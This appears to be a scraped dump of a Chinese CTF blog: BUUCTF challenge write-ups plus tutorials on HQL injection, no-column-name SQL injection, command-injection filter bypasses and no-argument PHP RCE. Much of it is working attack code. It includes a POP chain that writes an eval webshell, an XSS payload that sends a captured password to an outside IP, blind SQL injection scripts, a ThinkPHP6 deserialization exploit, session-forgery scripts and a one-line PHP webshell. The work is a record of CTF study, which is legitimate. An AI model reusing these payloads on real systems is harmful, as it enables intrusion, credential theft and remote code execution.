2019]EzPOP 构造pop链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php class A { protected $store; protected $key; protected $expire; public function __construct($store,$key,$expire) { $this-\u0026gt;key=$key; $this-\u0026gt;expire=$expire; $this-\u0026gt;store=$store; } } class B{ public $option; } $b=new B(); $b-\u0026gt;options[\u0026#39;serialize\u0026#39;]=\u0026#39;base64_decode\u0026#39;; $b-\u0026gt;options[\u0026#39;data_compress\u0026#39;]=false; $b-\u0026gt;options[\u0026#39;prefix\u0026#39;]=\u0026#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=uploads/\u0026#39;; $a=new A($b,\u0026#39;shell.php\u0026#39;,0); $a-\u0026gt;autosave=false; $a-\u0026gt;cache=array(); $a-\u0026gt;complete=base64_encode(base64_encode(\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39;)); echo urlencode(serialize($a)); ?\u0026gt; [GWCTF 2019]mypassword 注册登入后查看feedback.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 if(is_array($feedback)){ echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;反馈不合法\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34;; return false; } $blacklist = [\u0026#39;_\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;#\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;input\u0026#39;,\u0026#39;script\u0026#39;,\u0026#39;iframe\u0026#39;,\u0026#39;host\u0026#39;,\u0026#39;onload\u0026#39;,\u0026#39;onerror\u0026#39;,\u0026#39;srcdoc\u0026#39;,\u0026#39;location\u0026#39;,\u0026#39;svg\u0026#39;,\u0026#39;form\u0026#39;,\u0026#39;img\u0026#39;,\u0026#39;src\u0026#39;,\u0026#39;getElement\u0026#39;,\u0026#39;document\u0026#39;,\u0026#39;cookie\u0026#39;]; foreach ($blacklist as $val) { while(true){ if(stripos($feedback,$val) !== false){ $feedback = str_ireplace($val,\u0026#34;\u0026#34;,$feedback); }else{ break; } } } 黑名单一看就是xss\n由于前面login.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 if (document.cookie \u0026amp;\u0026amp; document.cookie != \u0026#39;\u0026#39;) { var cookies = document.cookie.split(\u0026#39;; \u0026#39;); var cookie = {}; for (var i = 0; i \u0026lt; cookies.length; i++) { var arr = cookies[i].split(\u0026#39;=\u0026#39;); var key = arr[0]; cookie[key] = arr[1]; } if(typeof(cookie[\u0026#39;user\u0026#39;]) != \u0026#34;undefined\u0026#34; \u0026amp;\u0026amp; typeof(cookie[\u0026#39;psw\u0026#39;]) != \u0026#34;undefined\u0026#34;){ document.getElementsByName(\u0026#34;username\u0026#34;)[0].value = cookie[\u0026#39;user\u0026#39;]; document.getElementsByName(\u0026#34;password\u0026#34;)[0].value = cookie[\u0026#39;psw\u0026#39;]; } } 记住密码功能会将读取cookie中的password\n于是构造一个登录框并且引入login.js提交反馈等待bot点开获得flag\n1 2 3 4 5 6 7 \u0026lt;incookieput type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;incookieput type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;scrcookieipt scookierc=\u0026#34;./js/login.js\u0026#34;\u0026gt;\u0026lt;/scrcookieipt\u0026gt; \u0026lt;scrcookieipt\u0026gt; var psw = docucookiement.getcookieElementsByName(\u0026#34;password\u0026#34;)[0].value; docucookiement.locacookietion=\u0026#34;http://47.122.53.248:2333/?psw=\u0026#34;+psw; \u0026lt;/scrcookieipt\u0026gt; [HFCTF2020]BabyUpload 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 \u0026lt;?php error_reporting(0); session_save_path(\u0026#34;/var/babyctf/\u0026#34;); session_start(); require_once \u0026#34;/flag\u0026#34;; highlight_file(__FILE__); if($_SESSION[\u0026#39;username\u0026#39;] ===\u0026#39;admin\u0026#39;) { $filename=\u0026#39;/var/babyctf/success.txt\u0026#39;; if(file_exists($filename)){ safe_delete($filename); die($flag); } } else{ $_SESSION[\u0026#39;username\u0026#39;] =\u0026#39;guest\u0026#39;; } $direction = filter_input(INPUT_POST, \u0026#39;direction\u0026#39;); $attr = filter_input(INPUT_POST, \u0026#39;attr\u0026#39;); $dir_path = \u0026#34;/var/babyctf/\u0026#34;.$attr; if($attr===\u0026#34;private\u0026#34;){ $dir_path .= \u0026#34;/\u0026#34;.$_SESSION[\u0026#39;username\u0026#39;]; } if($direction === \u0026#34;upload\u0026#34;){ try{ if(!is_uploaded_file($_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;])){ throw new RuntimeException(\u0026#39;invalid upload\u0026#39;); } $file_path = $dir_path.\u0026#34;/\u0026#34;.$_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;name\u0026#39;]; $file_path .= \u0026#34;_\u0026#34;.hash_file(\u0026#34;sha256\u0026#34;,$_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if(preg_match(\u0026#39;/(\\.\\.\\/|\\.\\.\\\\\\\\)/\u0026#39;, $file_path)){ throw new RuntimeException(\u0026#39;invalid file path\u0026#39;); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;],$file_path)){ $upload_result = \u0026#34;uploaded\u0026#34;; }else{ throw new RuntimeException(\u0026#39;error while saving\u0026#39;); } } catch (RuntimeException $e) { $upload_result = $e-\u0026gt;getMessage(); } } elseif ($direction === \u0026#34;download\u0026#34;) { try{ $filename = basename(filter_input(INPUT_POST, \u0026#39;filename\u0026#39;)); $file_path = $dir_path.\u0026#34;/\u0026#34;.$filename; if(preg_match(\u0026#39;/(\\.\\.\\/|\\.\\.\\\\\\\\)/\u0026#39;, $file_path)){ throw new RuntimeException(\u0026#39;invalid file path\u0026#39;); } if(!file_exists($file_path)) { throw new RuntimeException(\u0026#39;file not exist\u0026#39;); } header(\u0026#39;Content-Type: application/force-download\u0026#39;); header(\u0026#39;Content-Length: \u0026#39;.filesize($file_path)); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#34;\u0026#39;.substr($filename, 0, -65).\u0026#39;\u0026#34;\u0026#39;); if(readfile($file_path)){ $download_result = \u0026#34;downloaded\u0026#34;; }else{ throw new RuntimeException(\u0026#39;error while saving\u0026#39;); } } catch (RuntimeException $e) { $download_result = $e-\u0026gt;getMessage(); } exit; } ?\u0026gt; 由于session是PHPSESSID我们直接sess_sessid查看session文件\n处理器应该为php_binary\n脚本伪造session文件\n1 2 3 4 5 6 \u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php_binary\u0026#39;); session_save_path(\u0026#34;./\u0026#34;); session_start(); $_SESSION[\u0026#39;username\u0026#39;] = \u0026#39;admin\u0026#39;; 文件名改为sess，利用hash_file来计算sha256\n1 2 \u0026lt;?php echo hash_file(\u0026#39;sha256\u0026#39;, \u0026#39;./sess\u0026#39;); 得到文件名sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4\n上传用postman\n或者脚本传\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import hashlib from io import BytesIO def BeAdmin(): # print(BytesIO(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;))) files = { \u0026#34;up_file\u0026#34;: (\u0026#34;sess\u0026#34;, BytesIO(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;))) } data = { \u0026#39;attr\u0026#39;:\u0026#39;.\u0026#39;, \u0026#39;direction\u0026#39;:\u0026#39;upload\u0026#39; } url = \u0026#39;http://375fb983-49c0-4074-a8e6-6c98e5206ddc.node5.buuoj.cn:81/\u0026#39; r = requests.post(url=url,data=data,files=files) session_id = hashlib.sha256(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() return session_id 这里我用apifox,上传用upload\n接着上传success.txt\n然后把session值改一下就行了\n[SWPU2019]Web4 上来盲注出备份文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #author: c1e4r import requests import json import time def main(): #题目地址 url = \u0026#39;\u0026#39;\u0026#39;http://f30f0574-3492-4a09-a14f-203db6705c1a.node5.buuoj.cn:81/index.php?r=Login/Login\u0026#39;\u0026#39;\u0026#39; #注入payload payloads = \u0026#34;asd\u0026#39;;set @a=0x{0};prepare ctftest from @a;execute ctftest-- -\u0026#34; flag = \u0026#39;\u0026#39; for i in range(1,30): #查询payload payload = \u0026#34;select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)\u0026#34; for j in range(0,128): #将构造好的payload进行16进制转码和json转码 datas = {\u0026#39;username\u0026#39;:payloads.format(str_to_hex(payload.format(i,j))),\u0026#39;password\u0026#39;:\u0026#39;test213\u0026#39;} data = json.dumps(datas) times = time.time() res = requests.post(url = url, data = data) if time.time() - times \u0026gt;= 3: flag = flag + chr(j) print(flag) break def str_to_hex(s): return \u0026#39;\u0026#39;.join([hex(ord(c)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;) for c in s]) if __name__ == \u0026#39;__main__\u0026#39;: main() glzjin_wants_a_girl_friend.zip\n审计源码发现listdata这个变量可控，userindex.php里面可以传入img_file跟flag路径就可以读取了\n1 index.php?r=User/Index\u0026amp;img_file=/../flag.php [安洵杯 2019]iamthinking www.zip下载源码\nthinkphp6反序列化\n最后一步要用parse_url的漏洞加//就行\npoc工具https://github.com/wh1t3p1g/phpggc\n利用链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 think\\Model --\u0026gt; __destruct() think\\Model --\u0026gt; save() think\\Model --\u0026gt; updateData() think\\Model --\u0026gt; checkAllowFields() think\\Model --\u0026gt; db() 后半部分利用链（同tp 5.2后半部分利用链) think\\model\\concern\\Conversion --\u0026gt; __toString() think\\model\\concern\\Conversion --\u0026gt; __toJson() think\\model\\concern\\Conversion --\u0026gt; __toArray() think\\model\\concern\\Attribute --\u0026gt; getAttr() think\\model\\concern\\Attribute --\u0026gt; getValue() exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 \u0026lt;?php namespace think\\model\\concern { trait Conversion { } trait Attribute { private $data; private $withAttr = [\u0026#34;xxx\u0026#34; =\u0026gt; \u0026#34;system\u0026#34;]; public function get() { $this-\u0026gt;data = [\u0026#34;xxx\u0026#34; =\u0026gt; \u0026#34;cat /flag\u0026#34;]; } } } namespace think{ abstract class Model{ use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; protected $withEvent; private $exists; private $force; protected $field; protected $schema; protected $table; function __construct(){ $this-\u0026gt;lazySave = true; $this-\u0026gt;withEvent = false; $this-\u0026gt;exists = true; $this-\u0026gt;force = true; $this-\u0026gt;field = []; $this-\u0026gt;schema = []; $this-\u0026gt;table = true; } } } namespace think\\model{ use think\\Model; class Pivot extends Model { function __construct($obj=\u0026#39;\u0026#39;) { //定义this-\u0026gt;data不为空 parent::__construct(); $this-\u0026gt;get(); $this-\u0026gt;table = $obj; } } $a = new Pivot(); $b = new Pivot($a); echo urlencode(serialize($b)); } [PASECA2019]honey_shop 图片有任意文件读取\n读取proc/self/enviorn\n读到secretkey伪造session\n1 F5SmhLBQtsPYGpBRZxe56E0Nwk7LJ369gSI2Kl4h [Black Watch 入群题]Web 盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import requests flag=\u0026#39;\u0026#39; #查库名 payload1 = \u0026#39;1^(ascii(substr((select(database())),{},1))\u0026gt;{})^1\u0026#39; #库名为news #查表名 payload2 = \u0026#39;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\\u0026#39;news\\\u0026#39;)),{},1))\u0026gt;{})^1\u0026#39; #表名为admin,contents #查字段 payload3 = \u0026#39;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\\\u0026#39;contents\\\u0026#39;)),{},1))\u0026gt;{})^1\u0026#39; #admin表里有id,username,password,is_enable # contents表里有id,title,content,is_enable #查字段值 payload4 = \u0026#39;1^(ascii(substr((select(group_concat(password))from(admin)),{},1))\u0026gt;{})^1\u0026#39; #分别查username和password for i in range(1,100): low =28 high =137 mid = (low + high) // 2 while(low \u0026lt; high): url = \u0026#39;http://f695d102-a73b-4b8a-a546-b63ea583f09f.node5.buuoj.cn:81/backend/content_detail.php?id=\u0026#39; payload = payload4.format(i,mid) url+=payload print(url) r = requests.get(url) text = str(r.json()) if \u0026#34;札师傅缺个女朋友\u0026#34; in text: low = mid + 1 else: high = mid mid = (low + high) // 2 if(chr(mid)==\u0026#39;\u0026#39;): break flag +=chr(mid) print(flag) print(flag) [GoogleCTF2019 Quals]Bnv ","date":"2025-01-10T00:00:00Z","image":"https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/1.png","permalink":"https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/","title":"buuctf刷题"},{"content":"HQL注入（Hibernate框架） Hibernate是一种ORM框架，它是支持使用原生SQL或HQL语言(Hibernate框架自己的语言)进行SQL操作的\n通常使用Hibernate框架都是使用HQL语言方式进行查询\n1、原生SQL语句\n1 2 3 String parameter = req.getParameter(\u0026#34;name\u0026#34;); Query query = session.createSQLQuery(\u0026#34;SELECT table_name FROM information_schema.tables where table_schema=?\u0026#34;); query.setParameter(1, parameter); 2、HQL语句\n将数据库tables映射为相关的类，通过此类进行数据查询，使用的是HQL自己的语言\n1 2 3 String parameter = req.getParameter(\u0026#34;name\u0026#34;); Query query = session.createQuery(\u0026#34;from com.demo.bean.User where tableschema = ?1\u0026#34;, User.class); query.setParameter(1, parameter); 1、Hibernate框架首先会去解析createQuery()函数中语句是否符合HQL语法，不符合则会HQL语法错误\n2、符合HQL语法后，HQL框架会将语句解析成对应数据库的原生SQL语句\n3、最后将原生SQL语句去数据库中进行查询获取结果，此时原生SQL语句如果不正确则会导致数据库层面的报错（不同数据库则是不同的报错了）\n1 2 3 1、information_schema.tables表名映射为com.demo.bean.User类 2、table_name字段映射为tablename 3、table_schema字段映射为tableschema 简单HQL层面注入 union查询在5.6.15版本之前不支持\n1 name=mysql\u0026#39; union select 1,\u0026#39;2 #报错 6.x版本开始支持union查询，但是也只能利用HQL语法\n1 name=mysql\u0026#39; union from User where \u0026#39;1\u0026#39;=\u0026#39;1 不能使用单行注释#或+--+\n1 2 3 ?name=mysql\u0026#39;and/**/\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;+--+ #报错 ?name=mysql\u0026#39;and/**/\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# #报错 ?name=mysql\u0026#39;and#%0d%0a\u0026#39;1\u0026#39;=\u0026#39;1 #报错 不支持*查询\n1 ?name=mysql\u0026#39; and (select * from User where tablename=\u0026#39;user\u0026#39;)=\u0026#39;user 怎么查询：\n1、如果有报错信息的话，那就根据报错回显去看表名、列名，根据表名进行盲注或报错注入查询数据。或者根据回显去猜测可能存在的表名和列名，然后进行查询数据\n2、如果没有报错信息的话\n使用and或or进行列名的枚举\n1 ?name=mysql\u0026#39; and xxxxx = \u0026#39;1 使用子查询进行表名枚举\n1 ?name=mysql\u0026#39;or+(select+1+from+XXXX+where+1=2)=\u0026#39;1 HQL注入的常见类型可以总结为两种：布尔盲注和报错注入。\nHQL注入需要两次or\n逃逸HQL层面注入 低于5.x版本逃逸 1、在5.6.15之前，WHERE子句中是可以使用用户自定义函数的，这就说明数据库本身的函数也是可以使用的\n1 2 updatexml() version() 2、在5.6.15版本之前，存在着对单引号转义的差异导致的逃逸问题\n在HQL语言，字符串和常规SQL语句一样都是使用单引号包裹\n1 from Tables where name = \u0026#39;mysql\u0026#39; 引擎是不会对字符串里面的内容进行解析的\n当在字符串中加入一个转译字符\n1 from Tables where name = \u0026#39;mysql\\\u0026#39; HQL引擎是不识别转译字符\\的，它会将tony\\作为一个字符串，原封不动的转为mysql语句\n此处就导致了一个差异，mysql是识别转译字符的，所以爆了语法错误\n然后利用这个差异，构造一个HQL以为是字符串，但转为mysql变成语句的POC即可\n1 mysql\\\u0026#39;\u0026#39;and+1=2+union+select+user(),version()# 拼接HQL语句，此时mysql\\''and+1=2+union+select+user(),version()#是一整个字符串，所以引擎不去解析\n1 from Tables where name = \u0026#39;mysql\\\u0026#39;\u0026#39;and+1=2+union+select+user(),version()#\u0026#39; 转为sql语句，这样就在低于5.x的版本实现用union进行注入\n高于6.x 版本逃逸 1、从6.0.1.Final版本开始，测试发现转译符\\失效\n所以无法用\\来逃逸\n2、在6.x版本中发现新增了一个sql()函数，在5.x版本是不支持的\n意思就是可以执行SQL语句，主要是两种方式\n1 2 sql(\u0026#39;select 1,2,3\u0026#39;) sql(\u0026#39;select 1,2,?\u0026#39;,\u0026#39;3\u0026#39;) 1、第一种是将函数里面的字符串直接拼接SQL语句中，然后去执行\n2、第二种就是将后面参数预编译替换占位符?，然后再拼接到SQL语句中执行\n1 ?name=mysql\u0026#39; and sql(\u0026#39;1=2 union select table_name,table_schema from information_schema.tables#\u0026#39;)=\u0026#39;1 通用版本逃逸 有一个函数在5.x和6.x都能使用，那就是JPQL语言的function()函数\n在Hibernate框架中是同时支持JPQL语言和HQL语言的\nfunction()函数是用来调用自定义函数或数据库自带函数的，和某些动态函数调用差不多吧\n1 2 3 4 function(\u0026#39;version\u0026#39;) =\u0026gt; version() function(\u0026#39;updatexml\u0026#39;,1,1,1) =\u0026gt; updatexml(1,1,1) function(\u0026#39;aaaa\u0026#39;\u0026#39;bbbb\u0026#39;,1,1,1) =\u0026gt; aaaa\u0026#39;\u0026#39;bbbb(1,1,1) 5.x版本 function(\u0026#39;aaaa\u0026#39;\u0026#39;bbbb\u0026#39;,1,1,1) =\u0026gt; aaaa\u0026#39;bbbb(1,1,1) 6.x版本 它首先将第一参数作为函数名，随后拼接一个括号，后面的参数则是括号里的内容\n而function()函数的利用和sql()函数一样，是直接拼接在解析后的SQL语句中的，而且第一参数的内容没有任何限制\n这样就可以构造一个可利用POC了\n1 ?name=mysql\u0026#39; and function(\u0026#39;1=2 union select table_name,table_schema from information_schema.tables#\u0026#39;)=\u0026#39; ","date":"2024-11-08T00:00:00Z","image":"https://0d000721999.github.io/p/hql%E6%B3%A8%E5%85%A5/1.jpg","permalink":"https://0d000721999.github.io/p/hql%E6%B3%A8%E5%85%A5/","title":"HQL注入"},{"content":"无列名注入 sql注入一般都会用到information_schema这个库（mysql自带的库），所以ban掉这个表是一个很好的防御手段，这时候就可以使用无列名注入来绕过。\nInnoDb引擎 mysql 5.5.8之后开始使用InnoDb作为默认引擎，mysql 5.6的InnoDb增加了innodb_index_stats和innodb_table_stats两张表\n这两张表记录了数据库和表的信息，但是没有列名\n1 2 select group_concat(database_name) from mysql.innodb_index_stats; select group_concat(table_name) from mysql.innodb_table_stats where database_name=database() sys库 MySQL 5.7开始增加了sys库，这个库可以用于快速了解系统元数据信息。sys库通过视图的形式把information_schema和performance_schema结合起来，查询令人容易理解的数据。\nsys.schema_auto_increment_columns 这个视图用于保存有自增字段的数据库信息，一般设计表时都会设置自增字段（如id）\n1 2 3 4 #查询数据库名 select table_schema from sys.schema_auto_increment_columns #查询表名 select table_name from sys.schema_auto_increment_columns where table_schema=databse() schema_table_statistics_with_buffer 不存在自增字段时使用schema_table_statistics_with_buffer\n1 2 3 4 5 6 # 查询数据库 select table_schema from sys.schema_table_statistics_with_buffer; select table_schema from sys.x$schema_table_statistics_with_buffer; # 查询指定数据库的表 select table_name from sys.schema_table_statistics_with_buffer where table_schema=database(); select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=database(); 无列名注入 上述的innodb引擎的表和sys库的表都无法查到列名，这里就需要使用无列名注入。\njoin、using join用于合并两个表，using表示使用什么字段进行连接，用using指定了连接字段则查询结果只返回连接字段\n1 select * from user as b join user using(id) as c 这里使用id进行连接，只会返回id列\n思路：利用join合并同一表，报错重复的列名，再利用using爆出所有的列名，union select需要前后查询的字段数一样，不然会报错\n1 2 3 4 5 6 7 8 # 得到 id 列名重复报错 select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b)as c; # 得到 username 列名重复报错 select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id))as c; # 得到 password 列名重复报错 select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id,username))as c; # 得到 user 表中的数据 select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id,username,password))as c; 子查询 利用union联合查询构造列名\n1 select 1,2,3,4 union select * from users 1 2 3 select `2` from (select 1,2,3,4 union select * from users)a select a.2 from (select 1,2,3,4 union select * from users)a #记得第一个2加反引号,或者使用a.2 1 2 3 4 5 select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(`3`) from (select 1,2,3 union select * from user)x; select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(x.3) from (select 1,2,3 union select * from users)x; select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x; order by盲注 order by对结果进行排序：0-9 a-z，不区分大小写\n1 2 3 select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;o\u0026#39; order by 3; select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;p\u0026#39; order by 3; select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;q\u0026#39; order by 3; 不使用表名查询 正常的 sql 查询如下：\n1 select * from `admin`; 其中，列名为 id、name、password，使用 union 查询：\n1 select 1,2,3 union select * from admin; 如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：\n1 select `3` from (select 1,2,3 union select * from admin)a; 末尾的 a 可以是任意字符，用于命名。\n当然，多数情况下，` 会被过滤。当 ```不能使用的时候，使用别名来代替：\n1 select b from (select 1,2,3 as b union select * from admin)a; 同时查询多个列：\n1 select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3; payload\n1 select a,b from posts where a=-1 union select 1,(select concat(`3`,0x2d,`4`) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1); 盲注\n1 ((SELECT 1,concat(\u0026#39;{result+chr(mid)}\u0026#39;, cast(\u0026#34;0\u0026#34; as JSON)))\u0026lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`)) 无select mysql 8.0.19新增语句table\n可以把table t简单理解成select * from t，和select的区别在于\ntable总是显示表的所有列 table不允许任何的行过滤;也就是说，TABLE不支持任何WHERE子句。 可以用来盲注表名 1 2 admin\u0026#39;and\\x0a(table\\x0ainformation_schema.TABLESPACES_EXTENSIONS\\x0alimit\\x0a7,1)\u0026gt; (BINARY(\u0026#39;{}\u0026#39;),\u0026#39;0\u0026#39;)# 同时代替select被过滤导致只能同表查询的问题\n","date":"2024-11-07T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/1.jpg","permalink":"https://0d000721999.github.io/p/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","title":"无列名注入"},{"content":"RCE 远程代码执行：Remote Code Execute\n远程命令执行：Remote Command Execute\nphp RCE函数 命令拼接符号 windows linux pikachu靶场练习 ping 直接在ip后\u0026amp;加命令\neval 用system(\u0026lsquo;ipconfig\u0026rsquo;)或者phpinfo()测试\nDVWA的RCE low 跟pikachu一样直接加\u0026amp;\nmedium 因为平台是Windows，而靶场过滤的是Linux连接符，所以跟上面一样\nhigh 查看源码管道符|后有空格\n我们不加空格直接拼接\nctfhub练习 eval执行 蚁剑连接，右键打开终端\n然后ls /根目录下就有flag\n命令注入-无过滤 要求输入ip,没有过滤\n直接输入127.0.0.1;ls查看目录下文件\n有一个php文件，cat查看没东西\n直接转base64编码\n1 127.0.0.1;cat xxx.php|base64 然后解码得到flag\n命令注入-过滤cat 改为less就行了\n其他命令\n1 2 3 4 5 6 7 8 cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的现实文件内容 less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 类似于cat -n，显示时输出行号 tailf 类似于tail -f 命令注入-过滤空格 1 使用$IFS$9、%09、\u0026lt;、\u0026gt;、\u0026lt;\u0026gt;、{,}、%20、${IFS}、${IFS}来代替空格 命令注入-过滤命令分隔符 cd跳目录再cat，或者%0a代替目录分隔符/(在url里面输入)\n过滤运算符 其实前面要base64是因为源码被注释了\n所以我们正常cat flag然后查看源码\n综合过滤 flag过滤用f***绕过\ncat改为more\n;用%0a\n然后跟上面一样构造payload到url里面\n1 127.0.0.1%0acd${IFS}f***_is_here${IFS}%0amore${IFS}f***_61177426640.php 防御 1、尽量不要使用命令执行的函数\n2、如果必须使用，需要做白名单处理\n3、用正则表达式对用户输入的内容进行处理\n4、使用WAF\n","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/rce/1.jpg","permalink":"https://0d000721999.github.io/p/rce/","title":"RCE"},{"content":"无参rce 1、getallheaders() getallheaders()返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好implode()这个函数就能胜任。\nimplode()能够直接将getallheaders()返回的数组转化为字符串。\n可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。\n1 ?exp=eval(implode(getallheaders())); 2、get_defined_vars() 该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与implode结合起来用。要用var_dump()输出\n用GET传入的参数会被显示在数组中的第一位\n要返回数组的第一个值要用current()函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通过这个函数将其取出来\n1 var_dump(current(get_defined_vars())); 如果我们传值是这样：\n1 ?get=a\u0026amp;shell=phpinfo(); 后面传入的shell=phpinfo();出现在了第一个数组的最后。\nend()函数可以倒序，也就是说我们可以将命令写到后面的参数再调用函数，执行shell命令\n1 ?exp=eval(end(current(get_defined_vars())));\u0026amp;shell=phpinfo(); 3、session_id() session_id()可以用来获取/设置当前会话 ID。 那么可以用这个函数来获取cookie中的phpsessionid了，并且这个值我们是可控的\n文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号)\n解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。\n1 2 ?exp=eval(hex2bin(session_id(session_start()))); 或者?exp=eval(session_start();system(hex2bin(session_id()))); 执行的命令bp写入16进制解析\n1 hex(\u0026#34;phpinfo();\u0026#34;)=706870696e666f28293b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 getchwd() 函数返回当前工作目录。 scandir() 函数返回指定目录中的文件和目录的数组。 dirname() 函数返回路径中的目录部分。 chdir() 函数改变当前的目录。 readfile() 输出一个文件。 current() 返回数组中的当前单元, 默认取第一个值。 pos() current() 的别名。 next() 函数将内部指针指向数组中的下一个元素，并输出。 end() 将内部指针指向数组中的最后一个元素，并输出。 array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。 array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。 array_slice() 函数在数组中根据条件取出一段值，并返回。 array_reverse() 函数返回翻转顺序的数组。 chr() 函数从指定的 ASCII 值返回字符。 hex2bin() — 转换十六进制字符串为二进制字符串。 getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。 localeconv() 函数返回一包含本地数字及货币格式信息的数组。 ","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/1.png","permalink":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/","title":"无参RCE"},{"content":"文件上传 一句话木马\n1 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; webshell https://github.com/tennc/webshell\n网站控制工具 中国菜刀 中国蚁剑 https://github.com/AntSwordProject/antSword\nweevely https://github.com/epinna/weevely3\n哥斯拉godzila https://github.com/BeichenDream/Godzilla\n冰蝎 behinder https://github.com/rebeyond/Behinder\nweevely(kali) 生成木马\n1 weevely generate cmd weevely.php 连接\n1 weevely ip cmd 就可以执行命令了\nupload-labs靶场练习 pass01 